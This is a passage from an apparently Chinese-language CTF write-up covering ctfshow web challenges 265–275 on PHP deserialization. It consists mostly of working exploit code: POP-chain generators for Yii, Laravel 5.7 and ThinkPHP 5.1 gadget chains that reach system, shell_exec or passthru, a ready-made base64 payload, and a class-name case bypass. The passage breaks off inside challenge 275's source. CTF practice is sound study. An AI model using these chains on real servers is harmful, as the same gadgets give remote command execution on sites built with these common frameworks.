$msg_2;<br><br>//O:7:&quot;message&quot;:4:&#123;s:4:&quot;from&quot;;s:1:&quot;a&quot;;s:3:&quot;msg&quot;;s:1:&quot;b&quot;;s:2:&quot;to&quot;;s:1:&quot;c&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;<br>//O:7:&quot;message&quot;:4:&#123;s:4:&quot;from&quot;;s:1:&quot;a&quot;;s:3:&quot;msg&quot;;s:1:&quot;b&quot;;s:2:&quot;to&quot;;s:4:&quot;fuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;<br>//O:7:&quot;message&quot;:4:&#123;s:4:&quot;from&quot;;s:1:&quot;a&quot;;s:3:&quot;msg&quot;;s:1:&quot;b&quot;;s:2:&quot;to&quot;;s:4:&quot;loveU&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;<br>//O:7:&quot;message&quot;:4:&#123;s:4:&quot;from&quot;;s:1:&quot;a&quot;;s:3:&quot;msg&quot;;s:1:&quot;b&quot;;s:2:&quot;to&quot;;s:135:&quot;fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;<br>//O:7:&quot;message&quot;:4:&#123;s:4:&quot;from&quot;;s:1:&quot;a&quot;;s:3:&quot;msg&quot;;s:1:&quot;b&quot;;s:2:&quot;to&quot;;s:135:&quot;loveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveU&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="web265"><a href="#web265" class="headerlink" title="web265"></a>web265</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?php<br>class ctfshowAdmin&#123;<br>    public $token;<br>    public $password;<br><br>    public function __construct($t,$p)&#123;<br>        $this-&gt;token=$t;<br>        $this-&gt;password = $p;<br>    &#125;<br>    public function login()&#123;<br>        return $this-&gt;token===$this-&gt;password;<br>    &#125;<br>&#125;<br><br>$ctfshow = unserialize($_GET[&#x27;ctfshow&#x27;]);<br>$ctfshow-&gt;token=md5(mt_rand());<br><br>if($ctfshow-&gt;login())&#123;<br>    echo $flag;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>让token全等于password，这边用指针赋值</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?php<br>class ctfshowAdmin&#123;<br>    public $token;<br>    public $password;<br><br>    public function __construct($t,$p)&#123;<br>        $this-&gt;token=$t;<br>        $this-&gt;password = $p;<br>    &#125;<br>    public function login()&#123;<br>        return $this-&gt;token===$this-&gt;password;<br>    &#125;<br>&#125;<br><br>$a=new ctfshowAdmin(&#x27;a&#x27;,&#x27;b&#x27;);<br>$a-&gt;password=&amp;$a-&gt;token;<br>echo urlencode(serialize($a));<br></code></pre></td></tr></table></figure>
+
+<h3 id="web266"><a href="#web266" class="headerlink" title="web266"></a>web266</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs text">include(&#x27;flag.php&#x27;);<br>$cs = file_get_contents(&#x27;php://input&#x27;);<br><br>class ctfshow&#123;<br>    public $username=&#x27;xxxxxx&#x27;;<br>    public $password=&#x27;xxxxxx&#x27;;<br>    public function __construct($u,$p)&#123;<br>        $this-&gt;username=$u;<br>        $this-&gt;password=$p;<br>    &#125;<br>    public function login()&#123;<br>        return $this-&gt;username===$this-&gt;password;<br>    &#125;<br>    public function __toString()&#123;<br>        return $this-&gt;username;<br>    &#125;<br>    public function __destruct()&#123;<br>        global $flag;<br>        echo $flag;<br>    &#125;<br>&#125;<br>$ctfshowo=@unserialize($cs);<br>if(preg_match(&#x27;/ctfshow/&#x27;, $cs))&#123;<br>    throw new Exception(&quot;Error $ctfshowo&quot;,1);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>主要就是要绕过正则匹配，出异常就不能销毁了，就触发不了<code>__destruct()</code></p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs text">payload：O:7:&quot;ctfshow&quot;:2:&#123;&#125;<br>类名存在但是里面的反序列化失败依旧会执行__destruct()这个销毁方法，需要在bp上提交hackbar试了不行<br>还有一种方法是可以大小写绕过，因为PHP不区分大小写<br>O:7:&quot;Ctfshow&quot;:2:&#123;s:8:&quot;username&quot;;s:6:&quot;xxxxxx&quot;;s:8:&quot;password&quot;;s:6:&quot;xxxxxx&quot;;&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="web267"><a href="#web267" class="headerlink" title="web267"></a>web267</h3><p>Yii反序列化漏洞</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?php<br><br>namespace yii\rest&#123;<br>    class IndexAction&#123;<br>        public $checkAccess;<br>        public $id;<br>        public function __construct()&#123;<br>            $this-&gt;checkAccess = &#x27;highlight_file&#x27;;<br>            $this-&gt;id = &#x27;/flag&#x27;;				//命令执行<br>        &#125;<br>    &#125;<br>&#125;<br>namespace Faker &#123;<br><br>    use yii\rest\IndexAction;<br><br>    class Generator<br>    &#123;<br>        protected $formatters;<br><br>        public function __construct()<br>        &#123;<br>            $this-&gt;formatters[&#x27;close&#x27;] = [new IndexAction(), &#x27;run&#x27;];<br>        &#125;<br>    &#125;<br>&#125;<br>namespace yii\db&#123;<br><br>    use Faker\Generator;<br><br>    class BatchQueryResult&#123;<br>        private $_dataReader;<br>        public function __construct()<br>        &#123;<br>            $this-&gt;_dataReader=new Generator();<br>        &#125;<br>    &#125;<br>&#125;<br>namespace&#123;<br><br>    use yii\db\BatchQueryResult;<br><br>    echo base64_encode(serialize(new BatchQueryResult()));<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>其他可以使用的有</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text">shell_exec(&quot;cat /flag | tee 1&quot;);<br>passthru(&quot;tac /flag&quot;);<br>highlight_file(&quot;/flag&quot;);<br></code></pre></td></tr></table></figure>
+
+<h3 id="web268"><a href="#web268" class="headerlink" title="web268"></a>web268</h3><p>换了个链子，上题的命令还能用</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?php<br><br>namespace Faker;<br>class DefaultGenerator&#123;<br>    protected $default ;<br>    function __construct($argv)<br>    &#123;<br>        $this-&gt;default = $argv;<br>    &#125;<br>&#125;<br><br>class ValidGenerator&#123;<br>    protected $generator;<br>    protected $validator;<br>    protected $maxRetries;<br>    function __construct($command,$argv)<br>    &#123;<br>        $this-&gt;generator = new DefaultGenerator($argv);<br>        $this-&gt;validator = $command;<br>        $this-&gt;maxRetries = 99999999;<br>    &#125;<br>&#125;<br><br>namespace Codeception\Extension;<br>use Faker\ValidGenerator;<br>class RunProcess&#123;<br>    private $processes = [];<br>    function __construct($command,$argv)<br>    &#123;<br>        $this-&gt;processes[] = new ValidGenerator($command,$argv);<br>    &#125;<br>&#125;<br><br>$exp = new RunProcess(&#x27;shell_exec&#x27;,&#x27;cat /flags | tee 1&#x27;);<br>echo(base64_encode(serialize($exp)));<br></code></pre></td></tr></table></figure>
+
+<h3 id="web269"><a href="#web269" class="headerlink" title="web269"></a>web269</h3><p>上题的能用</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?php<br><br>namespace Faker;<br>class DefaultGenerator&#123;<br>    protected $default ;<br>    function __construct($argv)<br>    &#123;<br>        $this-&gt;default = $argv;<br>    &#125;<br>&#125;<br><br>class ValidGenerator&#123;<br>    protected $generator;<br>    protected $validator;<br>    protected $maxRetries;<br>    function __construct($command,$argv)<br>    &#123;<br>        $this-&gt;generator = new DefaultGenerator($argv);<br>        $this-&gt;validator = $command;<br>        $this-&gt;maxRetries = 99999999;<br>    &#125;<br>&#125;<br><br>namespace Codeception\Extension;<br>use Faker\ValidGenerator;<br>class RunProcess&#123;<br>    private $processes = [];<br>    function __construct($command,$argv)<br>    &#123;<br>        $this-&gt;processes[] = new ValidGenerator($command,$argv);<br>    &#125;<br>&#125;<br><br>$exp = new RunProcess(&#x27;highlight_file&#x27;,&#x27;/flagsa&#x27;);<br>echo(base64_encode(serialize($exp)));<br></code></pre></td></tr></table></figure>
+
+<h3 id="web270"><a href="#web270" class="headerlink" title="web270"></a>web270</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?php<br><br>namespace Faker;<br>class DefaultGenerator&#123;<br>    protected $default ;<br>    function __construct($argv)<br>    &#123;<br>        $this-&gt;default = $argv;<br>    &#125;<br>&#125;<br><br>class ValidGenerator&#123;<br>    protected $generator;<br>    protected $validator;<br>    protected $maxRetries;<br>    function __construct($command,$argv)<br>    &#123;<br>        $this-&gt;generator = new DefaultGenerator($argv);<br>        $this-&gt;validator = $command;<br>        $this-&gt;maxRetries = 99999999;<br>    &#125;<br>&#125;<br><br>namespace Codeception\Extension;<br>use Faker\ValidGenerator;<br>class RunProcess&#123;<br>    private $processes = [];<br>    function __construct($command,$argv)<br>    &#123;<br>        $this-&gt;processes[] = new ValidGenerator($command,$argv);<br>    &#125;<br>&#125;<br><br>$exp = new RunProcess(&#x27;shell_exec&#x27;,&#x27;tac /flagsaa | tee 1&#x27;);<br>echo(base64_encode(serialize($exp)));<br></code></pre></td></tr></table></figure>
+
+<p>还是能用。。。</p>
+<h3 id="web271"><a href="#web271" class="headerlink" title="web271"></a>web271</h3><p>Laravel v5.7反序列化漏洞</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?php<br>namespace Illuminate\Foundation\Testing&#123;<br>    class PendingCommand&#123;<br>        protected $command;<br>        protected $parameters;<br>        protected $app;<br>        public $test;<br>        public function __construct($command, $parameters,$class,$app)&#123;<br>            $this-&gt;command = $command;<br>            $this-&gt;parameters = $parameters;<br>            $this-&gt;test=$class;<br>            $this-&gt;app=$app;<br>        &#125;<br>    &#125;<br>&#125;<br>namespace Illuminate\Auth&#123;<br>    class GenericUser&#123;<br>        protected $attributes;<br>        public function __construct(array $attributes)&#123;<br>            $this-&gt;attributes = $attributes;<br>        &#125;<br>    &#125;<br>&#125;<br>namespace Illuminate\Foundation&#123;<br>    class Application&#123;<br>        protected $hasBeenBootstrapped = false;<br>        protected $bindings;<br>        public function __construct($bind)&#123;<br>            $this-&gt;bindings=$bind;<br>        &#125;<br>    &#125;<br>&#125;<br>namespace&#123;<br>    $genericuser = new Illuminate\Auth\GenericUser(<br>        array(<br>            &quot;expectedOutput&quot;=&gt;array(&quot;0&quot;=&gt;&quot;1&quot;),<br>            &quot;expectedQuestions&quot;=&gt;array(&quot;0&quot;=&gt;&quot;1&quot;)<br>             )<br>    );<br>    $application = new Illuminate\Foundation\Application(<br>        array(<br>            &quot;Illuminate\Contracts\Console\Kernel&quot;=&gt;<br>                array(<br>                    &quot;concrete&quot;=&gt;&quot;Illuminate\Foundation\Application&quot;<br>                     )<br>             )<br>    );<br>    $pendingcommand = new Illuminate\Foundation\Testing\PendingCommand(<br>        &quot;system&quot;,array(&#x27;cat /flag&#x27;),<br>        $genericuser,<br>        $application<br>    );<br>    echo urlencode(serialize($pendingcommand));<br>&#125;<br>?&gt;<br></code></pre></td></tr></table></figure>
+
+<h3 id="web272"><a href="#web272" class="headerlink" title="web272"></a>web272</h3><p>也是Laravel反序列化漏洞，换个链子</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs text">&lt;?php<br>namespace Illuminate\Broadcasting&#123;<br><br>    use Illuminate\Bus\Dispatcher;<br>    use Illuminate\Foundation\Console\QueuedCommand;<br><br>    class PendingBroadcast<br>    &#123;<br>        protected $events;<br>        protected $event;<br>        public function __construct()&#123;<br>            $this-&gt;events=new Dispatcher();<br>            $this-&gt;event=new QueuedCommand();<br>        &#125;<br>    &#125;<br>&#125;<br>namespace Illuminate\Foundation\Console&#123;<br><br>    use Mockery\Generator\MockDefinition;<br><br>    class QueuedCommand<br>    &#123;<br>        public $connection;<br>        public function __construct()&#123;<br>            $this-&gt;connection=new MockDefinition();<br>        &#125;<br>    &#125;<br>&#125;<br>namespace Illuminate\Bus&#123;<br><br>    use Mockery\Loader\EvalLoader;<br><br>    class Dispatcher<br>    &#123;<br>        protected $queueResolver;<br>        public function __construct()&#123;<br>            $this-&gt;queueResolver=[new EvalLoader(),&#x27;load&#x27;];<br>        &#125;<br>    &#125;<br>&#125;<br>namespace Mockery\Loader&#123;<br>    class EvalLoader<br>    &#123;<br><br>    &#125;<br>&#125;<br>namespace Mockery\Generator&#123;<br>    class MockConfiguration<br>    &#123;<br>        protected $name=&quot;feng&quot;;<br>    &#125;<br>    class MockDefinition<br>    &#123;<br>        protected $config;<br>        protected $code;<br>        public function __construct()<br>        &#123;<br>            $this-&gt;code=&quot;&lt;?php system(&#x27;cat /flag&#x27;);exit()?&gt;&quot;;<br>            $this-&gt;config=new MockConfiguration();<br>        &#125;<br>    &#125;<br>&#125;<br><br>namespace&#123;<br><br>    use Illuminate\Broadcasting\PendingBroadcast;<br><br>    echo urlencode(serialize(new PendingBroadcast()));<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h3 id="web273"><a href="#web273" class="headerlink" title="web273"></a>web273</h3><p>上题的还能用</p>
+<h3 id="web274"><a href="#web274" class="headerlink" title="web274"></a>web274</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs text">ThinkPHP5.1反序列化漏洞<br>&lt;?php<br>namespace think\process\pipes&#123;<br><br>    use think\model\Pivot;<br><br>    class Windows<br>    &#123;<br>        private $files = [];<br>        public function __construct()&#123;<br>            $this-&gt;files[]=new Pivot();<br>        &#125;<br>    &#125;<br>&#125;<br>namespace think&#123;<br>    abstract class Model<br>    &#123;<br>        protected $append = [];<br>        private $data = [];<br>        public function __construct()&#123;<br>            $this-&gt;data=array(<br>              &#x27;Xendria&#x27;=&gt;new Request()<br>            );<br>            $this-&gt;append=array(<br>                &#x27;Xendria&#x27;=&gt;array(<br>                    &#x27;hello&#x27;=&gt;&#x27;world&#x27;<br>                )<br>            );<br>        &#125;<br>    &#125;<br>&#125;<br>namespace think\model&#123;<br><br>    use think\Model;<br><br>    class Pivot extends Model<br>    &#123;<br><br>    &#125;<br>&#125;<br>namespace think&#123;<br>    class Request<br>    &#123;<br>        protected $hook = [];<br>        protected $filter;<br>        protected $config = [<br>            // 表单请求类型伪装变量<br>            &#x27;var_method&#x27;       =&gt; &#x27;_method&#x27;,<br>            // 表单ajax伪装变量<br>            &#x27;var_ajax&#x27;         =&gt; &#x27;&#x27;,<br>            // 表单pjax伪装变量<br>            &#x27;var_pjax&#x27;         =&gt; &#x27;_pjax&#x27;,<br>            // PATHINFO变量名 用于兼容模式<br>            &#x27;var_pathinfo&#x27;     =&gt; &#x27;s&#x27;,<br>            // 兼容PATH_INFO获取<br>            &#x27;pathinfo_fetch&#x27;   =&gt; [&#x27;ORIG_PATH_INFO&#x27;, &#x27;REDIRECT_PATH_INFO&#x27;, &#x27;REDIRECT_URL&#x27;],<br>            // 默认全局过滤方法 用逗号分隔多个<br>            &#x27;default_filter&#x27;   =&gt; &#x27;&#x27;,<br>            // 域名根，如thinkphp.cn<br>            &#x27;url_domain_root&#x27;  =&gt; &#x27;&#x27;,<br>            // HTTPS代理标识<br>            &#x27;https_agent_name&#x27; =&gt; &#x27;&#x27;,<br>            // IP代理获取标识<br>            &#x27;http_agent_ip&#x27;    =&gt; &#x27;HTTP_X_REAL_IP&#x27;,<br>            // URL伪静态后缀<br>            &#x27;url_html_suffix&#x27;  =&gt; &#x27;html&#x27;,<br>        ];<br>        public function __construct()&#123;<br>            $this-&gt;hook[&#x27;visible&#x27;]=[$this,&#x27;isAjax&#x27;];<br>            $this-&gt;filter=&quot;system&quot;;<br>        &#125;<br>    &#125;<br>&#125;<br>namespace&#123;<br><br>    use think\process\pipes\Windows;<br><br>    echo base64_encode(serialize(new Windows()));<br>&#125;<br><br>#data=TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mjp7czo5OiIAKgBhcHBlbmQiO2E6MTp7czo3OiJYZW5kcmlhIjthOjE6e3M6NToiaGVsbG8iO3M6NToid29ybGQiO319czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czo3OiJYZW5kcmlhIjtPOjEzOiJ0aGlua1xSZXF1ZXN0IjozOntzOjc6IgAqAGhvb2siO2E6MTp7czo3OiJ2aXNpYmxlIjthOjI6e2k6MDtyOjg7aToxO3M6NjoiaXNBamF4Ijt9fXM6OToiACoAZmlsdGVyIjtzOjY6InN5c3RlbSI7czo5OiIAKgBjb25maWciO2E6MTA6e3M6MTA6InZhcl9tZXRob2QiO3M6NzoiX21ldGhvZCI7czo4OiJ2YXJfYWpheCI7czowOiIiO3M6ODoidmFyX3BqYXgiO3M6NToiX3BqYXgiO3M6MTI6InZhcl9wYXRoaW5mbyI7czoxOiJzIjtzOjE0OiJwYXRoaW5mb19mZXRjaCI7YTozOntpOjA7czoxNDoiT1JJR19QQVRIX0lORk8iO2k6MTtzOjE4OiJSRURJUkVDVF9QQVRIX0lORk8iO2k6MjtzOjEyOiJSRURJUkVDVF9VUkwiO31zOjE0OiJkZWZhdWx0X2ZpbHRlciI7czowOiIiO3M6MTU6InVybF9kb21haW5fcm9vdCI7czowOiIiO3M6MTY6Imh0dHBzX2FnZW50X25hbWUiO3M6MDoiIjtzOjEzOiJodHRwX2FnZW50X2lwIjtzOjE0OiJIVFRQX1hfUkVBTF9JUCI7czoxNToidXJsX2h0bWxfc3VmZml4IjtzOjQ6Imh0bWwiO319fX19fQ==&amp;Xendria=cat /flag<br></code></pre></td></tr></table></figure>
+
+<h2 id="web275"><a href="#web275" class="headerlink" title="web275"></a>web275</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs text">怪题<br>&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: h1xa<br># @Date:   2020-12-08 19:13:36<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-12-08 20:08:07<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br><br>*/<br><br>highlight_file(__FILE__);<br><br>class filter&#123;<br>    public $filename;<br>    public $filecontent;<br>    public $evilfile=false;<br><br>    public function __construct($f,$fn)&#123;<br>        $this-&gt;filename=$f;<br>        $this-&gt;filecontent=$fn;<br>    &#125;<br>    public function checkevil()&#123;<br>        